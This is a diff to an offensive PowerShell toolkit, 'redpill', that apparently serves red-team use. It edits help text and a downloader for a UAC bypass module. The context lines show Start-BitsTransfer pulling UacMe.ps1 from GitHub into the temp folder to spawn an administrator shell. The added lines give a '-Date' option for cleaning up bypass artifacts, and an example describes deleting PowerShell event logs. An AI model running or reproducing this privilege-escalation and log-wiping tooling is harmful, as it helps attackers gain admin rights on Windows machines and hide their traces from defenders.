@@ -2558,6 +2558,9 @@ If($UacMe -ne "false"){
    .Parameter Execute
       Accepts the command\appl to be executed! (cmd|powershell)
 
+   .Parameter Date
+      Delete artifacts left behind by is 'CreationDate'
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -UacMe Bypass -Execute "cmd.exe"
       Local spawns an cmd prompt with administrator privileges! 
@@ -2601,7 +2604,7 @@ If($UacMe -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1 -Destination $Env:TMP\UacMe.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 16){## Corrupted download detected => DefaultFileSize: 16,78515625/KB
+      If($SizeDump -lt 17){## Corrupted download detected => DefaultFileSize: 17,212890625/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\UacMe.ps1"){Remove-Item -Path "$Env:TMP\UacMe.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -4188,6 +4191,9 @@ $HelpParameters = @"
    .Parameter Execute
       Accepts the command to be executed! (cmd|powershell)
 
+   .Parameter Date
+      Delete artifacts left behind by is 'CreationDate'
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -UacMe Bypass -Execute "cmd.exe"
       Local spawns an cmd prompt with administrator privileges! 
@@ -4208,6 +4214,10 @@ $HelpParameters = @"
       PS C:\> .\UacMe.ps1 -UacMe Clean
       Deletes uac bypass artifacts and powershell eventvwr logs!
       Remark: Admin privileges are required to delete PS logfiles.
+
+   .EXAMPLE
+      PS C:\> .\UacMe.ps1 -Action Clean -Date "19/04/2021"
+      Clean ALL artifacts left behind by this cmdlet by is 'CreationDate'
 
    .OUTPUTS
       Payload file written to C:\Windows\Temp\455pj4k3.inf
